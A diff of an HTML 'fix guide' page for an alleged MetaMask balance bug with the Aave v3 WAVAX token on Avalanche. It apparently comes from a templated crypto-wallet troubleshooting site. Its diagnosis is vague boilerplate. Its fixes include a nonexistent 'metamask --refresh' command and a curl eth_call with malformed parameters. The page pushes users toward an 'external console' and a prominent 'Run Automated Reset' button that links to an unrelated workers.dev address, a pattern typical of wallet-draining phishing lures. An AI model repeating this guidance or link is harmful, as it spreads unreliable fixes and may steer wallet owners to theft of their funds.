@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: -apple-system;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,32 +42,33 @@
 <h1>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Avalanche network may encounter an incorrect balance display for the Aave v3 WAVAX token, leading to confusion and potential errors in transactions.</li>
+<li>Users of the Metamask extension on the Avalanche network may notice that their Aave v3 WAVAX token balance is displayed incorrectly, potentially leading to confusion and incorrect financial decisions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch in the token's contract address or ABI (Application Binary Interface) within the Metamask extension, resulting in an incorrect balance fetch from the Ethereum blockchain.</li>
+<li>The issue arises from a bug in the Metamask extension's handling of token balances on the Aave v3 protocol, specifically affecting the WAVAX token on the Avalanche network. This discrepancy can occur due to outdated or incorrect configuration files within the extension.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the token's contract address to the correct one: <code>0x...</code></li>
-<li>Refresh the Metamask extension to re-fetch the token balance: <code>metamask --refresh</code></li>
-<li>Use the following JSON script to manually update the token's ABI:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Clear the browser's cache and restart the browser</li>
+<li>Execute the following command to manually refresh the token balance:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;abi&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="err">...</span><span class="p">]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.avax.network/ext/bc/C/rpc<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_call&quot;,&quot;params&quot;:[&quot;latest&quot;, {&quot;contract&quot;: &quot;0x...WAVAX_TOKEN_ADDRESS&quot;}],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external interface for a more streamlined token management experience.</p>
+<p>For optimal results, consider utilizing an external console for more precise control over the commands. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Aave v3 WAVAX token added to the wallet</li>
-<li>Avalanche network selected in the Metamask extension</li>
+<li>Aave v3 protocol enabled on the Avalanche network</li>
+<li>WAVAX token added to the Metamask wallet</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
